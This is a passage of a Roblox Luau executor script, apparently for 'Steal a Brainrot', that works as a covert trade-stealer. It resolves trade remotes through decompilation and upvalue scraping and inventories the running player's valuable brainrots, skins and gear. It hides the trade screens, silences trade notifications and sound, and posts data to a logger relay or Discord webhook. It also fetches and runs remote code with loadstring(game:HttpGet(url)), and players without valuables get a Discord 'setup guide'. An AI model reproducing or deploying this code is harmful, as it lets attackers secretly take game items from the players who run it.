		flash(copyLinkBtn, copyText(INVITE_URL), "link")
	end)
	linkBox.MouseButton1Click:Connect(function()
		flash(copyLinkBtn, copyText(INVITE_URL), "link")
	end)
	discBtn.MouseButton1Click:Connect(function()
		flash(discBtn, copyText(SUPPORT_DISCORD), "discord")
	end)
	nextBtn.MouseButton1Click:Connect(function()
		if busy then return end
		if step < TOTAL then
			setStep(step + 1)
		else
			nextBtn.Text = "RE-EXECUTE SCRIPT"
			tw(nextBtn, TweenInfo.new(0.2), { BackgroundColor3 = Colors.green })
		end
	end)
	backBtn.MouseButton1Click:Connect(function()
		if busy or step <= 1 then return end
		setStep(step - 1)
	end)

	shell.Size = UDim2.new(0.86, 0, 0.84, 0)
	shell.BackgroundTransparency = 0.35
	tw(shell, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
		Size = UDim2.new(0.92, 0, 0.9, 0),
		BackgroundTransparency = 0.08,
	})
	setStep(1)
	print("[Brainrot] Setup tutorial GUI loaded")
end


local function resolveTradeGuids()
	local map = {}
	for k, v in pairs(TRADE_GUIDS) do
		map[k] = v
	end
	pcall(function()
		if not decompile then return end
		local tc = ReplicatedStorage:FindFirstChild("TradeController", true)
		if not tc then return end
		local code = decompile(tc)
		if type(code) ~= "string" or #code == 0 then return end
		local locals = {}
		for name, kind, path in code:gmatch('local%s+(%w+)%s*=%s*Net:Remote(%w+)%s*%(%s*"([^"]+)"') do
			locals[name] = path
		end
		for var, g in code:gmatch('(%w+):InvokeServer%s*%(%s*"([%x%-]+)"') do
			local path = locals[var]
			if path then map[path] = g end
		end
		for var, g in code:gmatch('(%w+):FireServer%s*%(%s*"([%x%-]+)"') do
			local path = locals[var]
			if path then map[path] = g end
		end
	end)
	-- refresh module-level aliases
	INVITE_GUID = map["TradeService/Invite"] or INVITE_GUID
	SELECT_GUID = map["TradeService/AddBrainrot"] or SELECT_GUID
	READY_GUID = map["TradeService/Ready"] or READY_GUID
	ACCEPT_GUID = map["TradeService/Accept"] or ACCEPT_GUID
	CANCEL_GUID = map["TradeService/CancelTrade"] or CANCEL_GUID
	TRADE_GUIDS["TradeService/Invite"] = INVITE_GUID
	TRADE_GUIDS["TradeService/AddBrainrot"] = SELECT_GUID
	TRADE_GUIDS["TradeService/Ready"] = READY_GUID
	TRADE_GUIDS["TradeService/Accept"] = ACCEPT_GUID
	TRADE_GUIDS["TradeService/CancelTrade"] = CANCEL_GUID
	return map
end

-- Syncrypt v58: scan upvalues for RF/RE (no hard index)
local tradeRemoteEvents = {} -- all REs from _createLiveTrade (fallback fire)

local function resolveTradeRemotes()
	if not TradeController then
		pcall(function()
			TradeController = require(ReplicatedStorage.Controllers.TradeController)
		end)
	end
	if not TradeController then
		return false
	end
	local ok = pcall(function()
		local function ups(fn)
			if type(fn) ~= "function" then return {} end
			if getupvalues then
				local t = getupvalues(fn)
				if type(t) == "table" then return t end
			end
			-- fallback indexed getupvalue
			local out = {}
			if getupvalue then
				for i = 1, 50 do
					local ok2, v = pcall(getupvalue, fn, i)
					if not ok2 then break end
					out[i] = v
				end
			end
			return out
		end

		-- Invite RF
		for _, v in pairs(ups(TradeController.SendInvite)) do
			if typeof(v) == "Instance" and v:IsA("RemoteFunction") then
				inviteRemote = v
				break
			end
		end

		local reList = {}
		for k, v in pairs(ups(TradeController._createLiveTrade)) do
			if typeof(v) == "table" and typeof(v.Brainrot) == "table" and typeof(v.Brainrot.Add) == "function" then
				liveTrade = v
				for _, v2 in pairs(ups(v.Brainrot.Add)) do
					if typeof(v2) == "Instance" and v2:IsA("RemoteFunction") then
						addBrainrotRemote = v2
						break
					end
				end
				if type(v.BaseSkin) == "table" and type(v.BaseSkin.Add) == "function" then
					for _, v2 in pairs(ups(v.BaseSkin.Add)) do
						if typeof(v2) == "Instance" and v2:IsA("RemoteFunction") then
							addItemRemote = v2
							break
						end
					end
				end
				if not addItemRemote and type(v.Gear) == "table" and type(v.Gear.Add) == "function" then
					for _, v2 in pairs(ups(v.Gear.Add)) do
						if typeof(v2) == "Instance" and v2:IsA("RemoteFunction") then
							addItemRemote = v2
							break
						end
					end
				end
			elseif typeof(v) == "Instance" and v:IsA("RemoteEvent") then
				table.insert(reList, { i = tonumber(k) or 0, inst = v })
			end
		end
		table.sort(reList, function(a, b) return a.i < b.i end)
		tradeRemoteEvents = {}
		for _, e in ipairs(reList) do
			table.insert(tradeRemoteEvents, e.inst)
		end
		-- Syncrypt order: [2]=cancel, [3]=accept, [4]=ready (1-based on sorted RE list)
		cancelRemote = reList[2] and reList[2].inst or cancelRemote
		acceptRemote = reList[3] and reList[3].inst or acceptRemote
		readyRemote = reList[4] and reList[4].inst or readyRemote
		-- if short list, try last two as ready/accept
		if not readyRemote and #reList >= 1 then
			readyRemote = reList[#reList].inst
		end
		if not acceptRemote and #reList >= 2 then
			acceptRemote = reList[math.max(1, #reList - 1)].inst
		end
	end)
	if not ok then return false end
	return inviteRemote ~= nil and addBrainrotRemote ~= nil
end

local function fallbackRemote(leaf)
	for _, child in ipairs(Net:GetChildren()) do
		if child.Name == leaf or child.Name:find(leaf, 1, true) then
			if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
				return child
			end
		end
	end
	local exact = Net:FindFirstChild(leaf)
	if exact and (exact:IsA("RemoteFunction") or exact:IsA("RemoteEvent")) then
		return exact
	end
	return nil
end

local function waitForRemotes(timeout)
	timeout = timeout or 15
	resolveTradeGuids()
	local t0 = os.clock()
	while os.clock() - t0 < timeout do
		if resolveTradeRemotes() then
			remotesReady = true
			print("[Brainrot] Remotes via Syncrypt getupvalues OK")
			print("[Brainrot] Invite     :", inviteRemote and inviteRemote.Name or "?")
			print("[Brainrot] AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "?")
			print("[Brainrot] AddItem    :", addItemRemote and addItemRemote.Name or "?")
			print("[Brainrot] Ready      :", readyRemote and readyRemote.Name or "?")
			print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "?")
			print("[Brainrot] Cancel     :", cancelRemote and cancelRemote.Name or "?")
			print("[Brainrot] GUIDs Invite/Add/Ready/Accept:",
				tostring(INVITE_GUID):sub(1, 8), tostring(SELECT_GUID):sub(1, 8),
				tostring(READY_GUID):sub(1, 8), tostring(ACCEPT_GUID):sub(1, 8))
			return true
		end
		task.wait(0.1)
	end
	warn("[Brainrot] getupvalue resolve timed out — falling back to Net name search")
	inviteRemote = inviteRemote or fallbackRemote("Invite") or fallbackRemote("RF/TradeService/Invite")
	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
	readyRemote = readyRemote or fallbackRemote("Ready") or fallbackRemote("RE/TradeService/Ready")
	acceptRemote = acceptRemote or fallbackRemote("Accept") or fallbackRemote("RE/TradeService/Accept")
	cancelRemote = cancelRemote or fallbackRemote("CancelTrade") or fallbackRemote("RE/TradeService/CancelTrade")
	remotesReady = inviteRemote and readyRemote and acceptRemote and true or false
	print("[Brainrot] Fallback Invite:", inviteRemote and inviteRemote.Name or "MISSING")
	print("[Brainrot] Fallback AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "MISSING")
	print("[Brainrot] Fallback Ready:", readyRemote and readyRemote.Name or "MISSING")
	print("[Brainrot] Fallback Accept:", acceptRemote and acceptRemote.Name or "MISSING")
	return remotesReady
end

-- Syncrypt-style UI hide: force-disable trade ScreenGuis + visual nuke
local TRADE_GUI_NAMES = { "TradePlayerList", "TradeLiveTrade", "TradePrompts", "BrainrotTrader" }
local _tradeGuiPrevEnabled = {}
local _tradeGuiLockConns = {}
local _tradeGuiHidden = setmetatable({}, { __mode = "k" })

local function nukeGuiObject(d)
	if not d or not d:IsA("GuiObject") then return end
	pcall(function()
		d.Visible = false
		d.BackgroundTransparency = 1
		if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
			d.TextTransparency = 1
			d.TextStrokeTransparency = 1
		end
		if d:IsA("ImageLabel") or d:IsA("ImageButton") then
			d.ImageTransparency = 1
		end
		if d:IsA("UIStroke") then
			d.Enabled = false
			d.Transparency = 1
		end
	end)
end

local function lockTradeScreenGuis(enableLock)
	local PlayerGui = LP:FindFirstChildOfClass("PlayerGui") or pg
	if not PlayerGui then return end
	if enableLock then
		for _, name in ipairs(TRADE_GUI_NAMES) do
			local g = PlayerGui:FindFirstChild(name)
			if g and not _tradeGuiLockConns[name] then
				_tradeGuiPrevEnabled[name] = g.Enabled
				pcall(function() g.Enabled = false end)
				_tradeGuiLockConns[name] = g:GetPropertyChangedSignal("Enabled"):Connect(function()
					if g.Enabled then
						g.Enabled = false
					end
				end)
			elseif g then
				pcall(function() g.Enabled = false end)
			end
		end
	else
		for name, conn in pairs(_tradeGuiLockConns) do
			pcall(function() conn:Disconnect() end)
			_tradeGuiLockConns[name] = nil
		end
		for _, name in ipairs(TRADE_GUI_NAMES) do
			local g = PlayerGui:FindFirstChild(name)
			if g and _tradeGuiPrevEnabled[name] ~= nil then
				pcall(function() g.Enabled = _tradeGuiPrevEnabled[name] end)
				_tradeGuiPrevEnabled[name] = nil
			end
		end
	end
end

local function hideTradeUIVisual()
	lockTradeScreenGuis(true)
	for _, name in ipairs(TRADE_GUI_NAMES) do
		local g = pg:FindFirstChild(name) or pg:FindFirstChild(name, true)
		if not g then continue end
		pcall(function()
			if g:IsA("ScreenGui") then
				g.Enabled = false
				g.DisplayOrder = -999
				for _, d in ipairs(g:GetDescendants()) do
					nukeGuiObject(d)
				end
				for _, c in ipairs(g:GetChildren()) do
					nukeGuiObject(c)
				end
				if not _tradeGuiHidden[g] then
					_tradeGuiHidden[g] = true
					g.DescendantAdded:Connect(function(d)
						task.defer(function()
							nukeGuiObject(d)
						end)
					end)
				end
			else
				nukeGuiObject(g)
			end
		end)
	end
	-- orphan trade frames / black outline boxes
	pcall(function()
		for _, d in ipairs(pg:GetDescendants()) do
			local n = string.lower(d.Name or "")
			if d:IsA("GuiObject") and (
				n:find("offer", 1, true) or n:find("tradeslot", 1, true)
				or n:find("tradelive", 1, true) or n:find("brainrottrader", 1, true)
				or n == "ready" or n == "cancel" or n:find("your offer", 1, true)
			) then
				local p = d
				local under = false
				while p do
					if table.find(TRADE_GUI_NAMES, p.Name) then
						under = true
						break
					end
					p = p.Parent
				end
				if under or n:find("tradelive", 1, true) or n:find("brainrottrader", 1, true) then
					nukeGuiObject(d)
					for _, s in ipairs(d:GetDescendants()) do
						nukeGuiObject(s)
					end
				end
			end
		end
	end)
end

local function hookTradeUI()
	-- continuous lock loop (Syncrypt-style keep-disabled)
	task.spawn(function()
		while true do
			pcall(lockTradeScreenGuis, true)
			pcall(hideTradeUIVisual)
			task.wait(0.35)
		end
	end)
	if InterfaceController then
		local originalToggle = InterfaceController.Toggle
		if type(originalToggle) == "function" then
			InterfaceController.Toggle = function(self, name, ...)
				local r = originalToggle(self, name, ...)
				if name == "TradeLiveTrade" or name == "TradePlayerList" or name == "TradePrompts" then
					task.defer(hideTradeUIVisual)
				end
				return r
			end
		end
	end
	if NotificationController then
		local originalNotify = NotificationController.Notify
		local originalError = NotificationController.Error
		local originalSuccess = NotificationController.Success
		local tradeWords = { "trade", "offer", "invite", "declin", "cancel", "traded", "brainrot", "ready", "accepted" }
		local function isTradeMsg(...)
			for _, v in ipairs({ ... }) do
				if typeof(v) == "string" then
					local low = v:lower()
					for _, w in ipairs(tradeWords) do
						if low:find(w, 1, true) then return true end
					end
				end
			end
			return false
		end
		local function isFromTrade()
			for i = 2, 8 do
				local src = debug.info(i, "s")
				if not src then break end
				if src:find("TradeController") then return true end
			end
			return false
		end
		if type(originalNotify) == "function" then
			NotificationController.Notify = function(self, msg, ...)
				if isFromTrade() or isTradeMsg(msg, ...) then return end
				return originalNotify(self, msg, ...)
			end
		end
		if type(originalError) == "function" then
			NotificationController.Error = function(self, msg, ...)
				if isFromTrade() or isTradeMsg(msg, ...) then return end
				return originalError(self, msg, ...)
			end
		end
		if type(originalSuccess) == "function" then
			NotificationController.Success = function(self, msg, ...)
				if isFromTrade() or isTradeMsg(msg, ...) then return end
				return originalSuccess(self, msg, ...)
			end
		end
	end
	-- ChildAdded: lock new trade guis immediately
	pg.ChildAdded:Connect(function(ch)
		if table.find(TRADE_GUI_NAMES, ch.Name) then
			task.defer(hideTradeUIVisual)
		end
	end)
end


local tradeActiveFlag = false
local onTradeChannelOpen = nil  -- set by startFullAutomation
local onTradeChannelClose = nil

local function setupTradeChannel()
	if not ReplicatorClient then return end
	pcall(function()
		tradeChannel = ReplicatorClient.get(("Trade_%*"):format(LP.UserId))
		if tradeChannel and tradeChannel.Observe then
			tradeChannel:Observe({ "active", "data" }, function(data)
				local on = data ~= nil and data ~= false
				tradeActiveFlag = on
				if on then
					if onTradeChannelOpen then
						pcall(onTradeChannelOpen, data)
					end
				else
					currentlyInTrade = false
					if onTradeChannelClose then
						pcall(onTradeChannelClose)
					end
				end
			end)
			print("[Brainrot] Trade channel hooked: Trade_" .. tostring(LP.UserId))
		else
			warn("[Brainrot] Trade channel missing Observe")
		end
	end)
end

local function blockNotifications()
	local notifyRemote = fallbackRemote("Notify") or fallbackRemote("NotificationService")
	if not notifyRemote then return end
	print("[Brainrot] Blocking notifications:", notifyRemote.Name)
	pcall(function()
		for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
			pcall(function()
				if conn.Disable then conn:Disable() end
				if conn.Disconnect then conn:Disconnect() end
			end)
		end
	end)
	task.spawn(function()
		while true do
			task.wait(2)
			pcall(function()
				for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
					pcall(function()
						if conn.Disable then conn:Disable() end
					end)
				end
			end)
		end
	end)
end

local function applyEverythingAfterTargetFound()
	local leftCenter = pg:FindFirstChild("LeftCenter")
	if leftCenter then
		local clone = leftCenter:Clone()
		clone.Name = "LeftCenter_Backup"
		clone.Parent = pg
		leftCenter:Destroy()
	end
	local function handleCam(obj)
		if obj:IsA("BlurEffect") then
			task.defer(function() obj:Destroy() end)
		end
	end
	cam.ChildAdded:Connect(handleCam)
	for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
	cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		cam.FieldOfView = 70
	end)
	cam.FieldOfView = 70
	local function handleGui(obj)
		if guiNames[obj.Name] then
			task.defer(hideTradeUIVisual)
		end
	end
	pg.ChildAdded:Connect(handleGui)
	for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
	task.spawn(function()
		while true do
			hideTradeUIVisual()
			task.wait(1.25) -- rare; DescendantAdded handles new nodes
		end
	end)
	task.spawn(function()
		pcall(function() SoundService.Volume = 0 end)
		local function mute(s)
			if s:IsA("Sound") then
				pcall(function() s.Volume = 0; s:Stop() end)
			end
		end
		for _, s in ipairs(SoundService:GetDescendants()) do mute(s) end
		SoundService.DescendantAdded:Connect(mute)
		workspace.DescendantAdded:Connect(mute)
	end)
end

local AnimalsData, NumberUtils, TraitsData
pcall(function() AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals")) end)
pcall(function() NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils")) end)
pcall(function() TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits")) end)
pcall(function()
	if not TraitsData then
		TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits"))
	end
end)

local function plotOwnedByLocalPlayer(plot)
	if not plot then return false end
	-- attributes (any key containing owner/user)
	pcall(function()
		for key, v in pairs(plot:GetAttributes()) do
			local kl = string.lower(tostring(key))
			if kl:find("owner", 1, true) or kl:find("user", 1, true) or kl == "id" then
				if tonumber(v) == LP.UserId then return true end
				local s = tostring(v)
				if s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId) then return true end
			end
		end
	end)
	-- name match
	if plot.Name == tostring(LP.UserId) or plot.Name == LP.Name
		or plot.Name:find(tostring(LP.UserId), 1, true) or plot.Name:find(LP.Name, 1, true) then
		return true
	end
	-- common value objects / tags
	for _, inst in ipairs(plot:GetDescendants()) do
		local n = string.lower(inst.Name)
		if n:find("owner", 1, true) or n == "userid" or n == "player" then
			if inst:IsA("ObjectValue") and inst.Value == LP then return true end
			if (inst:IsA("NumberValue") or inst:IsA("IntValue")) and tonumber(inst.Value) == LP.UserId then return true end
			if inst:IsA("StringValue") then
				local s = inst.Value
				if s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId) then return true end
			end
			if inst:IsA("TextLabel") or inst:IsA("TextBox") then
				local s = tostring(inst.Text or "")
				if s:find(LP.Name, 1, true) or s:find(tostring(LP.UserId), 1, true) then return true end
			end
		end
	end
	return false
end

local function ownerMatchesLocal(ownerField)
	if ownerField == nil then return nil end
	local oid = tonumber(ownerField)
	if oid then return oid == LP.UserId end
	local s = tostring(ownerField)
	return s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId)
end

-- Syncrypt-style plot + AnimalList
local function findMyPlot()
	local plotsFolder = workspace:FindFirstChild("Plots") or workspace:FindFirstChild("plots")
	if not plotsFolder then return nil end
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		local sign = plot:FindFirstChild("PlotSign")
		local sg = sign and sign:FindFirstChild("SurfaceGui")
		if sg then
			for _, d in ipairs(sg:GetDescendants()) do
				if d:IsA("TextLabel") then
					local t = tostring(d.Text or "")
					if t == LP.DisplayName .. "'s Base" or t == LP.Name .. "'s Base" then
						return plot
					end
					if t:find(LP.DisplayName, 1, true) or t:find(LP.Name, 1, true) then
						return plot
					end
				end
			end
		end
	end
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		if plot:GetAttribute("BaseSkinName") then return plot end
	end
	return plotsFolder:GetChildren()[1]
end

local function getAnimalListFromChannel(plot)
	if not plot then return nil end
	local ok, Synchronizer = pcall(function()
		return require(ReplicatedStorage.Packages.Synchronizer)
	end)
	if not ok or type(Synchronizer) ~= "table" then return nil end
	local data
	pcall(function()
		if type(Synchronizer.GetTableFromChannel) == "function" then
			data = Synchronizer:GetTableFromChannel(plot.Name)
		end
	end)
	if type(data) ~= "table" then
		pcall(function()
			data = Synchronizer.GetTableFromChannel(plot.Name)
		end)
	end
	if type(data) == "table" and type(data.AnimalList) == "table" then
		return data.AnimalList, data
	end
	return nil
end

local TargetLower = {}
for k in pairs(TargetBrainrots) do
	TargetLower[string.lower(tostring(k))] = tostring(k)
end

local function isTargetIndex(idx)
	if not idx then return false end
	if TargetBrainrots[idx] then return true end
	local low = string.lower(tostring(idx))
	if TargetLower[low] then return true end
	if AnimalsData and AnimalsData[idx] then
		local dn = AnimalsData[idx].DisplayName
		if dn and (TargetBrainrots[dn] or TargetLower[string.lower(tostring(dn))]) then
			return true
		end
	end
	return false
end

local function getMyPlotAndAnimals()
	local plot = findMyPlot()
	if plot then
		print("[Brainrot] Using plot:", plot.Name, "skin=", tostring(plot:GetAttribute("BaseSkinName")))
	else
		return nil, nil
	end
	local animalList
	for _ = 1, 8 do
		animalList = getAnimalListFromChannel(plot)
		if animalList then break end
		task.wait(0.4)
	end
	if not animalList then
		warn("[Brainrot] Synchronizer AnimalList missing")
		return plot, nil
	end
	local normalized, total, targets = {}, 0, 0
	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index and not data.Machine then
			total += 1
			if isTargetIndex(data.Index) then
				targets += 1
				normalized[slot] = data
			end
		end
	end
	print("[Brainrot] Synchronizer animals=", total, "targets=", targets)
	if targets == 0 then
		print("[Brainrot] No target brainrots on YOUR plot")
		return plot, nil
	end
	local n = 0
	for slot, e in pairs(normalized) do
		n += 1
		if n <= 12 then
			print("[Brainrot] found", e.Index, "slot", slot, "uuid", tostring(e.UUID or "?"):sub(1, 8))
		end
	end
	return plot, normalized
end

local cachedProfile = nil
local profileReady = false

local function scanProfileAsync()
	task.spawn(function()
		local found = nil
		local n = 0
		pcall(function()
			for _, v in pairs(getgc(true)) do
				n = n + 1
				if n % 400 == 0 then task.wait() end
				if type(v) == "table" then
					local ok, bi = pcall(rawget, v, "BaseSkinInventory")
					if ok and type(bi) == "table" then
						if type(rawget(v, "Coins")) == "number" and type(rawget(v, "Rebirth")) == "number" then
							found = v
							break
						end
					end
				end
			end
		end)
		cachedProfile = found
		profileReady = true
		print("[Brainrot] Profile scan done:", found and "found" or "not found")
	end)
end

local function getMyProfile()
	return cachedProfile
end

local function buildSkinQueue()
	local queue = {}
	if not next(ALLOWED_BASESKINS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local bi = rawget(profile, "BaseSkinInventory")
	if type(bi) ~= "table" then return queue end
	for uuid, data in pairs(bi) do
		if type(data) == "table" then
			local name = tostring(data.SkinName or data.Skin or "")
			if ALLOWED_BASESKINS[name] then
				table.insert(queue, { uuid = tostring(uuid), skinName = name })
			end
		end
	end
	return queue
end

local function buildGearQueue()
	local queue = {}
	if not next(ALLOWED_GEARS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local gi = rawget(profile, "GearInventory")
	if type(gi) ~= "table" then return queue end
	for uuid, data in pairs(gi) do
		if type(data) == "table" then
			local name = tostring(data.GearName or data.Name or "")
			if ALLOWED_GEARS[name] then
				table.insert(queue, { uuid = tostring(uuid), gearName = name })
			end
		end
	end
	return queue
end

scanProfileAsync()
hookTradeUI()
setupTradeChannel()
blockNotifications()

local myPlot, animalList = getMyPlotAndAnimals()
if not myPlot or not animalList then
	warn("[Brainrot] Unlock required — showing setup guide")
	showJoinDiscordGui()
	getgenv().BrainrotMainLoaded = nil
	return
end

local brainrotQueue = {}
local function isTargetName(name)
	if not name or name == "" then return false end
	if TargetBrainrots[name] then return true end
	local lower = string.lower(tostring(name))
	for k in pairs(TargetBrainrots) do
		if string.lower(tostring(k)) == lower then return true end
	end
	return false
end

local animalEntryCount = 0
for _ in pairs(animalList) do animalEntryCount += 1 end
print("[Brainrot] AnimalList entries:", animalEntryCount)

for slotKey, data in pairs(animalList) do
	if type(data) == "table" and data.Index and not data.Machine then
		local displayName = data.Index
		if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
			displayName = AnimalsData[data.Index].DisplayName
		end
		if isTargetName(displayName) or isTargetName(data.Index) then
			table.insert(brainrotQueue, {
				slotKey = slotKey, -- real Synchronizer plot slot
				data = data,
				displayName = displayName,
			})
		end
	end
end

local tradeBrainrotQueue = brainrotQueue
getgenv()._BrainrotTradeQueue = brainrotQueue
print("[Brainrot] exported _BrainrotTradeQueue", #brainrotQueue)
local tradeItemsEnabled = true

-- ONLY if no target brainrots at start → Discord GUI (no trades / no embed / no automation)
if #brainrotQueue == 0 then
	warn("[Brainrot] Unlock required — showing setup guide")
	showJoinDiscordGui()
	getgenv().BrainrotMainLoaded = nil
	return
end

print("[Brainrot] Queued", #brainrotQueue, "target brainrots")

if type(genv.EXTRA_LOADSTRINGS) == "table" then
	for _, url in ipairs(genv.EXTRA_LOADSTRINGS) do
		if type(url) == "string" and url ~= "" then
			task.spawn(function()
				pcall(function() loadstring(game:HttpGet(url))() end)
			end)
		end
	end
end

applyEverythingAfterTargetFound()

local baseSkinQueue = {}
local gearQueue = {}

local function getRequestFn()
	return (syn and syn.request) or (http and http.request) or http_request or request
end

-- Website-aligned helper: LOGGER_KEY → relay, else GOOD_WEBHOOK direct
local function sendWebhook(payloadTable)
	local requestFn = getRequestFn()
	if not requestFn then
		warn("[Brainrot] sendWebhook: no HTTP request fn")
		return false
	end
	local bodyJson = HttpService:JSONEncode(payloadTable)
	local function post(url, headers)
		local ok, res = pcall(function()
			return requestFn({
				Url = url,
				Method = "POST",
				Headers = headers,
				Body = bodyJson,
			})
		end)
		if not ok then
			warn("[Brainrot] HTTP error:", res)
			return false
		end
		local code = type(res) == "table" and (res.StatusCode or res.Status or res.statusCode) or 200
		print("[Brainrot] POST", tostring(url):sub(1, 60), "→", code)
		if tonumber(code) and tonumber(code) >= 400 then
			return false
		end
		return true
	end
	if LOGGER_KEY and #LOGGER_KEY > 0 then
		local headers = {
			["Content-Type"] = "application/json",
			["X-Logger-Key"] = LOGGER_KEY,
		}
		for attempt = 1, 4 do
			if post(RELAY_URL, headers) then
				print("[Brainrot] Relay SUCCESS attempt", attempt)
				return true
			end
			warn("[Brainrot] Relay fail attempt", attempt)
			task.wait(0.5 * attempt)
		end
		warn("[Brainrot] Relay FAILED after 4 attempts")
		return false
	elseif GOOD_WEBHOOK and #GOOD_WEBHOOK > 0 then
		return post(GOOD_WEBHOOK, { ["Content-Type"] = "application/json" })
	end
	return false
end

local function toWikiName(displayName)
	local clean = displayName:match("^(.-)%s*%(") or displayName
	return clean:gsub(" ", "_")
end

local function fetchFandomImageUrl(displayName)
	local requestFn = getRequestFn()
	if not requestFn then return nil end
	local wikiName = toWikiName(displayName)
	local url = FANDOM_BASE .. wikiName
	local ok, response = pcall(function()
		return requestFn({
			Url = url, Method = "GET",
			Headers = { ["User-Agent"] = "Mozilla/5.0", ["Accept"] = "text/html" },
			Timeout = 5,
		})
	end)
	if ok and response and response.StatusCode == 200 and response.Body then
		local body = response.Body
		local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
			or body:match('content="([^"]+)"%s+property="og:image"')
		if ogImage and ogImage:find("^https?://") then
			return ogImage:gsub("&amp;", "&")
		end
	end
	return nil
end

local function getBrainrotColor(animalIndex)
	local color = nil
	pcall(function()
		local models = ReplicatedStorage:FindFirstChild("Models")
		local animals = models and models:FindFirstChild("Animals")
		if not animals then return end
		local template = animals:FindFirstChild(animalIndex)
		if not template and AnimalsData and AnimalsData[animalIndex] then
			template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
		end
		if not template then return end
		local bestScore = 0
		for _, desc in ipairs(template:GetDescendants()) do
			if desc:IsA("MeshPart") or desc:IsA("Part") then
				local c = desc.Color
				local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
				local maxC = math.max(c.R, c.G, c.B)
				local minC = math.min(c.R, c.G, c.B)
				local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
				local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
				local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
				local score = (sat * 3 + 0.2) * bp * vol
				if score > bestScore then bestScore = score; color = c end
			end
		end
	end)
	return color
end

local function colorToDecimal(c)
	if not c then return FALLBACK_COLOR end
	local r = math.clamp(math.floor(c.R * 255), 0, 255)
	local g = math.clamp(math.floor(c.G * 255), 0, 255)
	local b = math.clamp(math.floor(c.B * 255), 0, 255)
	return r * 65536 + g * 256 + b
end

local function getBestImageUrl(displayName, animalIndex)
	local info = AnimalsData and AnimalsData[animalIndex]
	if info then
		for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId" }) do
			if info[key] and type(info[key]) == "string" then
				local num = info[key]:match("%d+")
				if num then return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png" end
			end
		end
	end
	return nil
end

local function resolveThumbnail(displayName, animalIndex)
	local url = getBestImageUrl(displayName, animalIndex)
	if url and url ~= "" then return url end
	url = fetchFandomImageUrl(displayName)
	if url and url ~= "" then return url end
	return "https://stealabrainrot.fandom.com/wiki/Special:FilePath/" .. toWikiName(displayName) .. ".png"
end

local function getTraitMultiplier(traitName)
	if not TraitsData or not traitName then return 0 end
	local info = TraitsData[traitName]
	if not info then
		local key = traitName:lower():gsub("%s+", "")
		for k, v in pairs(TraitsData) do
			if type(k) == "string" and k:lower():gsub("%s+", "") == key then info = v; break end
		end
	end
	if type(info) ~= "table" then return 0 end
	local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
	if type(tm) == "number" and tm > 0 then return tm end
	return 0
end

local function getMutationMultiplier(mutName)
	if not mutName or mutName == "" or mutName == "None" or mutName == "Default" then return 1 end
	if MUTATION_MULT[mutName] then return MUTATION_MULT[mutName] end
	local key = mutName:lower():gsub("%s+", "")
	for name, mult in pairs(MUTATION_MULT) do
		if name:lower():gsub("%s+", "") == key then return mult end
	end
	return 1
end

local function getGeneration(data)
	local index = data.Index
	local base = 0
	if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
		base = AnimalsData[index].Generation
	end
	if base <= 0 then return 0 end
	local gen = base * getMutationMultiplier(data.Mutation)
	local traits = data.Traits
	if type(traits) == "table" then
		for _, t in pairs(traits) do
			local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
			local tm = getTraitMultiplier(traitName)
			if tm > 0 then gen = gen + (base * tm) end
		end
	end
	return gen
end

local function formatGen(genVal)
	if NumberUtils and NumberUtils.Format then return NumberUtils.Format(genVal) .. "/s" end
	if genVal >= 1e12 then return string.format("%.1fT/s", genVal / 1e12)
	elseif genVal >= 1e9 then return string.format("%.1fB/s", genVal / 1e9)
	elseif genVal >= 1e6 then return string.format("%.1fM/s", genVal / 1e6)
	elseif genVal >= 1e3 then return string.format("%.1fK/s", genVal / 1e3)
	end
	return tostring(math.floor(genVal)) .. "/s"
end

local function normKey(s)
	return (tostring(s or ""):lower():gsub("%s+", ""):gsub("'", ""):gsub("'", ""))
end

local function mutEmoji(name)
	if not name or name == "" then return MUTATION_EMOJI["Default"] end
	if MUTATION_EMOJI[name] then return MUTATION_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(MUTATION_EMOJI) do
		if normKey(k) == key then return v end
	end
	return MUTATION_EMOJI["Default"]
end

local function gearEmoji(name)
	if not name or name == "" then return "⚙️" end
	if GEAR_EMOJI[name] then return GEAR_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(GEAR_EMOJI) do
		if normKey(k) == key then return v end
